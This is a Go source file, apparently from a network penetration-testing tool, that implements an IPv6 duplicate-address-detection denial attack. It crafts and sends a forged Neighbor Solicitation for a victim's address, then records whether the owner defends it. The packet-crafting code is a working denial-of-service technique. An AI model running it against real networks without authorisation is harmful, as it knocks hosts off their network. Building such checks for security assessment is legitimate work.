// daddos.go implements the duplicate-address denial attack via DAD.
//
// Durability (from the catalog): transient-decay. The attack sends a
// Neighbor Solicitation for the target address during DAD to deny the
// legitimate host's address configuration. The DAD window passes after
// the attack stops, and no explicit teardown.
//
// Edge scenario: against a host that completes DAD before the attack
// window, the behavior reports resisted rather than failed open. The
// behavior observes the legitimate owner's defending NA and reports
// the resisted outcome.

package ip6

import (
	"context"
	"encoding/json"
	"net"
	"time"

	"github.com/gopacket/gopacket"
	"github.com/gopacket/gopacket/layers"

	"go.aledante.io/FlowSeer/src/common/errs"

	"go.aledante.io/FlowSeer/src/edge/netpen/attacks/internal/craft"
	"go.aledante.io/FlowSeer/src/edge/netpen/check"
)

type dadDOSFinding struct {
	Action   string `json:"action"`
	Target   string `json:"target"`
	Resisted bool   `json:"resisted"`
	Frames   int    `json:"frames"`
}

// RunDADDOS sends a Neighbor Solicitation for the target's IPv6 victim
// address during DAD to deny the legitimate host's address configuration.
// A defending Neighbor Advertisement from the owner within 50 ms shows the
// host completed DAD first, and the finding records it. The verdict is pending:
// whether the host gave up the address needs a later probe it does not
// have. Cancellation while observing returns ctx.Err(), and terminal receive
// errors are wrapped.
func RunDADDOS(ctx context.Context, deps check.Deps) (check.Verdict, error) {
	if err := deps.Target.Need(check.FieldVictim6); err != nil {
		return check.Verdict{}, err
	}
	src := deps.AttackLeg.Addr().MAC
	target := deps.Target.Victim6.IP

	// Craft and send the DAD NS.
	pkt, err := craftDADNS(src, target)
	if err != nil {
		return check.Verdict{}, errs.Wrap(err, "daddos: craft NS")
	}
	if err := deps.AttackLeg.Send(ctx, pkt); err != nil {
		return check.Verdict{}, errs.Wrap(err, "daddos: send NS")
	}

	// Observe for a defending NA from the legitimate owner. If one
	// arrives within the DAD window, the attack is resisted (the host
	// completed DAD before the attack window).
	resisted := false
	ch := deps.AttackLeg.Receive(ctx)
	select {
	case frame, ok := <-ch:
		if err := ctx.Err(); err != nil {
			return check.Verdict{}, err
		}
		if ok {
			if frame.Err != nil {
				return check.Verdict{}, errs.Wrap(frame.Err, "daddos: receive defense")
			}
			na, err := decodeNA(frame.Data)
			if err == nil && na.TargetAddress.Equal(target) {
				// The legitimate owner is defending — resisted.
				resisted = true
			}
		}
	case <-time.After(50 * time.Millisecond):
		// No defending NA within the window — attack proceeds.
	case <-ctx.Done():
		return check.Verdict{}, ctx.Err()
	}
	if err := ctx.Err(); err != nil {
		return check.Verdict{}, err
	}

	detail, _ := json.Marshal(dadDOSFinding{
		Action:   "dad-denial",
		Target:   target.String(),
		Resisted: resisted,
		Frames:   1,
	})
	deps.Emitter.Finding("ipv6-nd", detail)

	return check.Pending("no observable: address denial needs a later probe of the victim"), nil
}

// craftDADNS builds a DAD Neighbor Solicitation: source is unspecified,
// destination is the solicited-node multicast for the target.
func craftDADNS(src net.HardwareAddr, target net.IP) ([]byte, error) {
	snMAC := solicitedNodeMAC(target)
	snIP := solicitedNodeIP(target)

	eth := &layers.Ethernet{
		DstMAC:       snMAC,
		SrcMAC:       src,
		EthernetType: layers.EthernetTypeIPv6,
	}
	ip := &layers.IPv6{
		Version:    6,
		NextHeader: layers.IPProtocolICMPv6,
		HopLimit:   255,
		SrcIP:      net.IPv6zero, // DAD: source is unspecified
		DstIP:      snIP,
	}
	icmp := &layers.ICMPv6{
		TypeCode: layers.CreateICMPv6TypeCode(layers.ICMPv6TypeNeighborSolicitation, 0),
	}
	_ = icmp.SetNetworkLayerForChecksum(ip)

	ns := &layers.ICMPv6NeighborSolicitation{
		TargetAddress: target,
		Options: layers.ICMPv6Options{
			{
				Type: layers.ICMPv6OptSourceAddress,
				Data: src, // attacker's source LLA
			},
		},
	}
	return craft.Default(eth, ip, icmp, ns)
}

// decodeNA decodes an ICMPv6 Neighbor Advertisement from raw frame
// bytes (Ethernet → IPv6 → ICMPv6 → NA).
func decodeNA(data []byte) (*layers.ICMPv6NeighborAdvertisement, error) {
	pkt := gopacket.NewPacket(data, layers.LayerTypeEthernet, gopacket.Default)
	naLayer := pkt.Layer(layers.LayerTypeICMPv6NeighborAdvertisement)
	if naLayer == nil {
		return nil, errs.Msg("no neighbor advertisement layer")
	}
	na, ok := naLayer.(*layers.ICMPv6NeighborAdvertisement)
	if !ok {
		return nil, errs.Msg("unexpected NA layer type")
	}
	return na, nil
}

var _ gopacket.SerializableLayer = (*layers.ICMPv6NeighborSolicitation)(nil)
